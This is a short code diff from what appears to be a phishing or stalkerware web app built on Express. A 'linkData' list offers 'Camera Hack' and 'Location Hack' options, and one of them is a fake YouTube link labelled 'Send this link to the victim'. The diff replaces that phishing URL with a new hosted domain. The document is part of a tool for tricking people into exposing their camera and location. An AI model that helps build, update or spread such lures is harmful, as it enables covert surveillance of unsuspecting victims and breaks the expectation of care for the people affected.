@@ -16,7 +16,7 @@ const app = express();
 const linkData = [
   {
     name: "📷 Camera Hack 📷",
-    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://youthub-video.odoo.com/" }]
+    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://common-cloud-wishbone.glitch.me/" }]
   },
   {
     name: "🌍 Location Hack 🌍",
